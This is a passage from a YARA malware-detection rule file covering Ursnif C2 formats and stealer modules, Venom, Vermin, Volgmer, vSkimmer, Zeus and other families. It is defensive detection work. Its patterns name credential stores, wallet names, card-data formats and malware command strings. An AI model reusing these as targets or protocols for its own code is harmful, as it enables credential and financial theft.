($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_ISFBv2_C_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, ISFBv2.C variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.ISFBv2.C\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"5d4665f06b06f637c79b539ee17b1c4e97e4b5485392aff7dcb3b33ec41ccf00\"\n\n    strings:\n        $positive_0 = \"&name=%s\"\n        $positive_1 = \"&type=%u\"\n        $positive_2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $positive_3 = \"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&ip=%s\"\n        $negative_8 = \"&os=%s\"\n        $negative_9 = \"&time=%lu\"\n        $negative_10 = \"&uptime=%u\"\n        $negative_11 = \"&user=%s\"\n        $negative_12 = \"(KHTML, like Gecko)\"\n        $negative_13 = \"(Windows NT %u.%u%s)\"\n        $negative_14 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_15 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_16 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_17 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_18 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_19 = \"AppleWebKit/537.36\"\n        $negative_20 = \"Chrome/64.0.3282.71\"\n        $negative_21 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_22 = \"Firefox/40.0.0\"\n        $negative_23 = \"Firefox/50.0\"\n        $negative_24 = \"Firefox/51.0\"\n        $negative_25 = \"Firefox/54.0\"\n        $negative_26 = \"Mozilla/5.0\"\n        $negative_27 = \"Safari/537.36\"\n        $negative_28 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_ISFBv3_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, ISFBv3 variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.ISFBv3\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"1d1465cb82703c988edd94792285a5f705f222868d632e3822aa5ca3c0550fe3\"\n\n    strings:\n        $positive_0 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $positive_1 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x&guid=%08x%08x%08x%08x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&id=%x\"\n        $negative_6 = \"&ip=%s\"\n        $negative_7 = \"&os=%s\"\n        $negative_8 = \"&time=%lu\"\n        $negative_9 = \"&uptime=%u\"\n        $negative_10 = \"&user=%s\"\n        $negative_11 = \"(KHTML, like Gecko)\"\n        $negative_12 = \"(Windows NT %u.%u%s)\"\n        $negative_13 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_14 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_15 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_16 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_17 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_18 = \"AppleWebKit/537.36\"\n        $negative_19 = \"Chrome/64.0.3282.71\"\n        $negative_20 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_21 = \"Firefox/40.0.0\"\n        $negative_22 = \"Firefox/50.0\"\n        $negative_23 = \"Firefox/51.0\"\n        $negative_24 = \"Firefox/54.0\"\n        $negative_25 = \"Mozilla/5.0\"\n        $negative_26 = \"Safari/537.36\"\n        $negative_27 = \"soft=%u\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_Nosoft_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, Nosoft variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.Nosoft\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"0b70525f45080b3c350572fe089ff64b7be2c7f39f807c0fc2cc6b20291f870e\"\n\n    strings:\n        $positive_0 = \"&user=%s\"\n        $positive_1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $positive_2 = \"version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $positive_3 = \"version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&type=%u&name=%s\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&ip=%s\"\n        $negative_8 = \"&os=%s\"\n        $negative_9 = \"&time=%lu\"\n        $negative_10 = \"&uptime=%u\"\n        $negative_11 = \"&version=%u\"\n        $negative_12 = \"(KHTML, like Gecko)\"\n        $negative_13 = \"(Windows NT %u.%u%s)\"\n        $negative_14 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_15 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_16 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_17 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_18 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_19 = \"AppleWebKit/537.36\"\n        $negative_20 = \"Chrome/64.0.3282.71\"\n        $negative_21 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_22 = \"Firefox/40.0.0\"\n        $negative_23 = \"Firefox/50.0\"\n        $negative_24 = \"Firefox/51.0\"\n        $negative_25 = \"Firefox/54.0\"\n        $negative_26 = \"Mozilla/5.0\"\n        $negative_27 = \"Safari/537.36\"\n        $negative_28 = \"soft=%u\"\n        $negative_29 = \"version=%u&soft=1&user=%08x%08x%08x%08x&server=%u&id=%u&type=%u&name=%s\"\n        $negative_30 = \"version=%u&soft=1&user=%s&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_RM3_A_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, RM3.A variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.RM3.A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"01b2e72a6ca18b91a382a67099d61045e167f24da53470478110ade44180186e\"\n\n    strings:\n        $positive_0 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $positive_1 = \"Mozilla/5.0 (Windows NT %u.%u;%s rv:50.0) Gecko/20100101 Firefox/50.0\"\n        $positive_2 = \"type=%u&soft=%u&version=%u&user=%08x%08x%08x%08x&group=%u&id=%x&arc=%u&crc=%08x&uptime=%u\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&crc=%x\"\n        $negative_3 = \"&guid=%08x%08x%08x%08x\"\n        $negative_4 = \"&id=%u\"\n        $negative_5 = \"&ip=%s\"\n        $negative_6 = \"&name=%s\"\n        $negative_7 = \"&os=%s\"\n        $negative_8 = \"&server=%u\"\n        $negative_9 = \"&time=%lu\"\n        $negative_10 = \"&type=%u\"\n        $negative_11 = \"&user=%s\"\n        $negative_12 = \"(KHTML, like Gecko)\"\n        $negative_13 = \"(Windows NT %u.%u%s)\"\n        $negative_14 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_15 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_16 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_17 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_18 = \"(compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $negative_19 = \"AppleWebKit/537.36\"\n        $negative_20 = \"Chrome/64.0.3282.71\"\n        $negative_21 = \"Firefox/40.0.0\"\n        $negative_22 = \"Firefox/51.0\"\n        $negative_23 = \"Firefox/54.0\"\n        $negative_24 = \"Mozilla/4.0\"\n        $negative_25 = \"Safari/537.36\"\n        $negative_26 = \"type=%u&soft=%u&version=%u&user=%08x%08x%08x%08x&group=%u&id=%08x&arc=%u&crc=%08x&uptime=%u\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_RM3_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, RM3 variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.RM3\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"04a499697ea84ecebfce88a4c55d3c6723eeed0a68526bba29131f11271e65a9\"\n\n    strings:\n        $positive_0 = \"Mozilla/5.0 (Windows NT %u.%u%s; Trident/7.0; rv:11.0) like Gecko\"\n        $positive_1 = \"type=%u&soft=%u&version=%u&user=%08x%08x%08x%08x&group=%u&id=%08x&arc=%u&crc=%08x&uptime=%u\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&crc=%x\"\n        $negative_3 = \"&guid=%08x%08x%08x%08x\"\n        $negative_4 = \"&id=%u\"\n        $negative_5 = \"&id=%x\"\n        $negative_6 = \"&ip=%s\"\n        $negative_7 = \"&name=%s\"\n        $negative_8 = \"&os=%s\"\n        $negative_9 = \"&server=%u\"\n        $negative_10 = \"&time=%lu\"\n        $negative_11 = \"&type=%u\"\n        $negative_12 = \"&user=%s\"\n        $negative_13 = \"(KHTML, like Gecko)\"\n        $negative_14 = \"(Windows NT %u.%u%s)\"\n        $negative_15 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_16 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_17 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_18 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_19 = \"(compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $negative_20 = \"AppleWebKit/537.36\"\n        $negative_21 = \"Chrome/64.0.3282.71\"\n        $negative_22 = \"Firefox/40.0.0\"\n        $negative_23 = \"Firefox/50.0\"\n        $negative_24 = \"Firefox/51.0\"\n        $negative_25 = \"Firefox/54.0\"\n        $negative_26 = \"Mozilla/4.0\"\n        $negative_27 = \"Safari/537.36\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_Stealing_Module_Cryptocurrency\n{   \n    meta:\n        author = \"VMRay Labs\"\n        description = \"Cryptocurrency stealing module's strings of Ursnif\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif.CryptocurrencyStealer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        sample = \"53f7d917ad9ebf5b7d2ccc1a835083bc0c0b92cc69ee584703ea6e4345f5c457\"\n\n    strings:\n        $s1 = \"electrum-\"\n\t\t$s2 = \"bitcoin\"\n\t\t$s3 = \"multibit-hd\"\n\t\t$s4 = \"bither\"\n\t\t$s5 = \"msigna.\"\n\t\t$s6 = \"Jaxx.\"\n\t\t$s7 = \"JEdudus.\"\n\t\t$s8 = \"armory-\"\n\t\t$s9 = \"veracrypt\"\n\t\t$s10 = \"truecrypt\"\n\n\tcondition:\n        // function string file\n        (\n            mime_type == \"text/plain\"\n        )\n        and all of ($s*)\n}\n\nrule Ursnif_Stealing_Module_Olstealer\n{   \n    meta:\n        author = \"VMRay Labs\"\n        description = \"OLSTEALER stealing module's strings of Ursnif\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif.OLStealer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        sample = \"53f7d917ad9ebf5b7d2ccc1a835083bc0c0b92cc69ee584703ea6e4345f5c457\"\n\n    strings:\n        $s1 = \"#OLSTEALER#\"\n\t\t$s2 = \"Software\\\\Microsoft\\\\Internet Account Manager\"\n\t\t$s3 = \"Software\\\\Microsoft\\\\Office\\\\Outlook\\\\OMI Account Manager\\\\Accounts\"\n\t\t\n\t\t$opt1 = \"SMTP Email Address\"\n\t\t$opt2 = \"SMTP Server\"\n\t\t$opt3 = \"POP3 Server\"\n\t\t$opt4 = \"POP3 User Name\"\n\t\t$opt5 = \"SMTP User Name\"\n\t\t$opt6 = \"NNTP Email Address\"\n\t\t$opt7 = \"NNTP User Name\"\n\t\t$opt8 = \"NNTP Server\"\n\t\t$opt9 = \"IMAP Server\"\n\t\t$opt10 = \"IMAP User Name\"\n\t\t$opt11 = \"Email\"\n\t\t$opt12 = \"HTTP User\"\n\t\t$opt13 = \"HTTP Server URL\"\n\t\t$opt14 = \"POP3 User\"\n\t\t$opt15 = \"IMAP User\"\n\t\t$opt16 = \"HTTPMail User Name\"\n\t\t$opt17 = \"HTTPMail Server\"\n\t\t$opt18 = \"SMTP User\"\n\t\t$opt19 = \"POP3 Password2\"\n\t\t$opt20 = \"IMAP Password2\"\n\t\t$opt21 = \"NNTP Password2\"\n\t\t$opt22 = \"HTTPMail Password2\"\n\t\t$opt23 = \"SMTP Password2\"\n\t\t$opt24 = \"POP3 Password\"\n\t\t$opt25 = \"IMAP Password\"\n\t\t$opt26 = \"NNTP Password\"\n\t\t$opt27 = \"HTTP Password\"\n\t\t$opt28 = \"SMTP Password\"\n\t\t$opt29 = \"POP3 Port\"\n\t\t$opt30 = \"SMTP Port\"\n\t\t$opt31 = \"IMAP Port\"\n\n    condition:\n\t\t// function string file\n        (\n            mime_type == \"text/plain\"\n        )\n        and all of ($s*)\n\t\tand 5 of ($opt*)\n}\n\nrule Ursnif_Stealing_Module_IEstealer\n{   \n    meta:\n        author = \"VMRay Labs\"\n        description = \"IESTEALER stealing module's strings of Ursnif\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif.IEStealer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        sample = \"53f7d917ad9ebf5b7d2ccc1a835083bc0c0b92cc69ee584703ea6e4345f5c457\"\n\n    strings:\n        $s1 = \"#IESTEALER#\"\n\t\t$s2 = \"Software\\\\Microsoft\\\\Internet Explorer\\\\IntelliForms\\\\Storage2\"\n\n    condition:\n\t\t// function string file\n        (\n            mime_type == \"text/plain\"\n        )\n        and all of ($s*)\n}\n\nrule Venom_Rootkit\n{\n    meta:\n        description = \"Venom Linux rootkit\"\n        ref = \"https://security.web.cern.ch/security/venom.shtml\"\n        classifications = \"Rootkit\"\n        threat_names = \"Venom\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Venom_Rootkit\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%%VENOM%CTRL%MODE%%\" ascii fullword\n        $s2 = \"%%VENOM%OK%OK%%\" ascii fullword\n        $s3 = \"%%VENOM%WIN%WN%%\" ascii fullword\n        $s4 = \"%%VENOM%AUTHENTICATE%%\" ascii fullword\n        $s5 = \". entering interactive shell\" ascii fullword\n        $s6 = \". processing ltun request\" ascii fullword\n        $s7 = \". processing rtun request\" ascii fullword\n        $s8 = \". processing get request\" ascii fullword\n        $s9 = \". processing put request\" ascii fullword\n        $s10 = \"venom by mouzone\" ascii fullword\n        $s11 = \"justCANTbeSTOPPED\" ascii fullword\n\n    condition:\n        filesize < 4000KB and 2 of them\n}\n\nrule Vermin_Keylogger_Jan18_1\n{\n    meta:\n        description = \"Vermin keylogger\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-vermin-quasar-rat-custom-malware-used-ukraine/\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"Vermin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Vermin_Keylogger_Jan18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"_keyloggerTaskDescription\" fullword ascii\n        $x2 = \"_keyloggerTaskAuthor\" fullword ascii\n        $x3 = \"GetKeyloggerLogsResponse\" fullword ascii\n        $x4 = \"GetKeyloggerLogs\" fullword ascii\n        $x5 = \"ExecuteUninstallKeyLoggerTask\" fullword ascii\n        $x6 = \"ExecuteInstallKeyLoggerTask\" fullword ascii\n        $x7 = \":\\\\Projects\\\\Vermin\\\\KeyboardHookLib\\\\\" ascii\n        $x8 = \":\\\\Projects\\\\Vermin\\\\CryptoLib\\\\\" ascii\n        $s1 = \"<RunHidden>k__BackingField\" fullword ascii\n        $s2 = \"set_SystemInfos\" fullword ascii\n        $s3 = \"set_RunHidden\" fullword ascii\n        $s4 = \"set_RemotePath\" fullword ascii\n        $s5 = \"ExecuteShellCommandTask\" fullword ascii\n        $s6 = \"Client.exe\" fullword wide\n        $s7 = \"xClient.Core.ReverseProxy.Packets\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and (1 of ($x*) or 3 of them)\n}\n\nprivate rule VidgrabCode : Vidgrab Family\n{\n    meta:\n        description = \"Vidgrab code tricks\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"VidgrabCode\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $divbyzero = { B8 02 00 00 00 48 48 BA 02 00 00 00 83 F2 02 F7 F0 }\n        $xorloop = { 03 C1 80 30 (66 | 58) 41 }\n        $junk = { 8B 4? ?? 8B 4? ?? 03 45 08 52 5A }\n\n    condition:\n        all of them\n}\n\nprivate rule VidgrabStrings : Vidgrab Family\n{\n    meta:\n        description = \"Vidgrab Identifying Strings\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"VidgrabStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = \"IDI_ICON5\" wide ascii\n        $ = \"starter.exe\"\n        $ = \"wmifw.exe\"\n        $ = \"Software\\\\rar\"\n        $ = \"tmp092.tmp\"\n        $ = \"temp1.exe\"\n\n    condition:\n        3 of them\n}\n\nrule Vidgrab : Family\n{\n    meta:\n        description = \"Vidgrab backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"Vidgrab\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"Vidgrab\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        VidgrabCode or VidgrabStrings\n}\n\nrule VirutFileInfector\n{\n    meta:\n        description = \"Virut bot\"\n        ref = \"http://reversingminds-blog.logdown.com\"\n        classifications = \"Bot, Virus\"\n        threat_names = \"Virut\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"D00RT <@D00RT_RM>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"VirutFileInfector\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $sign = { F9 E8 22 00 00 00 ?? 31 EB 56 }\n        $func = { 52 C1 E9 1D 68 31 D4 00 00 58 5A 81 C1 94 01 00 00 80 4D 00 F0 89 6C 24 04 F7 D1 81 6C 24 04 }\n\n    condition:\n        $sign and $func\n}\n\nrule TA17_318B_volgmer\n{\n    meta:\n        description = \"Volgmer trojan user agent\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-318B\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Volgmer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TA17_318B_volgmer\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s = \"Mozillar/\"\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $s\n}\n\nrule Volgmer_Malware\n{\n    meta:\n        description = \"Volgmer trojan\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-318B\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Volgmer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Volgmer_Malware\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"User-Agent: Mozillar/5.0\" fullword ascii\n        $x2 = \"[Cmd] - CMD_BOTCMD_CONNLOG_GET\" fullword wide\n        $x3 = \"[TestConnect To Bot] - Port = %d\" fullword ascii\n        $x4 = \"b50a338264226b6d57c1936d9db140ba74a28930270a083353645a9b518661f4fcea160d7\" ascii\n        $s1 = \"%sigfx%c%c%c.exe\" fullword wide\n        $s2 = \"H_%s_%016I64X_%04d%02d%02d%02d%02d%02d.TXT\" fullword ascii\n        $s3 = \"cmd.exe /c %s > %s 2>&1\" fullword wide\n        $s4 = \"%s\\\\dllcache\\\\%s.dll\" fullword ascii\n        $s5 = \"Cond Fail.\" fullword ascii\n        $s6 = \"The %s %s%s\" fullword ascii\n        $s7 = \"%s \\\"%s\\\"%s \\\"%s\\\" %s \\\"%s\\\"\" fullword ascii\n        $s8 = \"DLL_Spider.dll\" fullword ascii\n\n    condition:\n        filesize < 400KB and (1 of ($x*) or (uint16(0) == 0x5a4d and 2 of them)) or (uint16(0) == 0x5a4d and pe.imphash() == \"ea42395e901b33bad504798e0f0fd74b\")\n}\n\nrule vskimmer\n{\n    meta:\n        description = \"vSkimmer POS malware\"\n        classifications = \"Bot, Spyware\"\n        threat_names = \"vSkimmer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"vskimmer\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"User-Agent: PCICompliant/3.33\"\n        $s2 = \"[3-9]{1}[0-9]{12,19}[D=\\\\u0061][0-9]{10,30}\"\n        $s3 = \"PCI Compliant SCard\"\n\n    condition:\n        all of them\n}\n\nrule Wabot : Worm\n{\n    meta:\n        description = \"Wabot worm\"\n        classifications = \"Worm\"\n        threat_names = \"Wabot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Falcoz\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Wabot\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $signature1 = {43 3A 5C 6D 61 72 69 6A 75 61 6E 61 2E 74 78 74}\n        $signature2 = {73 49 52 43 34}\n\n    condition:\n        $signature1 and $signature2\n}\n\nrule XOR_DDosv1 : DDoS\n{\n    meta:\n        description = \"XOR DDos bot\"\n        classifications = \"Bot\"\n        threat_names = \"XOR DDos\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Akamai CSIRT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"XOR_DDosv1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $st0 = \"BB2FA36AAA9541F0\"\n        $st1 = \"md5=\"\n        $st2 = \"denyip=\"\n        $st3 = \"filename=\"\n        $st4 = \"rmfile=\"\n        $st5 = \"exec_packet\"\n        $st6 = \"build_iphdr\"\n\n    condition:\n        all of them\n}\n\nrule Zegost : Trojan\n{\n    meta:\n        description = \"Zegost trojan\"\n        classifications = \"Trojan\"\n        threat_names = \"Zegost\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Falcoz\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Zegost\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $signature1 = {39 2F 66 33 30 4C 69 35 75 62 4F 35 44 4E 41 44 44 78 47 38 73 37 36 32 74 71 59 3D}\n        $signature2 = {00 BA DA 22 51 42 6F 6D 65 00}\n\n    condition:\n        $signature1 and $signature2\n}\n\nrule Zeus_Panda\n{\n    meta:\n        description = \"Zeus Panda malware\"\n        ref = \"https://cyberwtf.files.wordpress.com/2017/07/panda-whitepaper.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"Zeus Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Zeus_Panda\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"SER32.dll\" fullword ascii\n        $x2 = \"/c start \\\"\\\" \\\"%s\\\"\" fullword wide\n        $x3 = \"del /F \\\"%s\\\"\" fullword ascii\n        $s1 = \"bcdfghklmnpqrstvwxz\" fullword ascii\n        $s2 = \"=> -,0;\" fullword ascii\n        $s3 = \"Yahoo! Slurp\" fullword ascii\n        $s4 = \"ZTNHGET ^&\" fullword ascii\n        $s5 = \"MSIE 9\" fullword ascii\n        $s6 = \"%s%08x.%s\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and (2 of ($x*) or 4 of them)\n}\n\nrule Zeus_1134\n{\n    meta:\n        description = \"Zeus trojan\"\n        ref = \"http://www.xylibox.com/2014/03/zeus-1134.html\"\n        classifications = \"Spyware\"\n        threat_names = \"Zeus\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        